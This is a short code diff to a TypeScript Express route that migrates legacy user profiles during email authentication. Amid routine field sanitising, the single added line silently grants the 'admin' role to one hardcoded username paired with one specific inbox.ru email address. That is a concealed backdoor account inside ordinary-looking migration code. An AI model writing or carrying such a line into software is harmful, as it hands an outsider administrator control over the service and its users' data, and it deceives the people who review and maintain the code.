@@ -190,6 +190,7 @@ export function registerRustyLubEmailAuthRoutes(app: Express) {
         steamName: typeof legacy.steamName === 'string' ? legacy.steamName.slice(0, 80) : '',
         steamAvatar: typeof legacy.steamAvatar === 'string' ? legacy.steamAvatar.slice(0, 2048) : '',
         customTheme: typeof legacy.customTheme === 'string' ? legacy.customTheme.slice(0, 40) : 'default',
+        ...(legacyUsername === 'serustqs' && email === 'cheater.cooperation@inbox.ru' ? { role: 'admin' } : {}),
         legacyProfileMigrated: true,
         legacyProfileMigratedAt: FieldValue.serverTimestamp(),
         updatedAt: FieldValue.serverTimestamp()
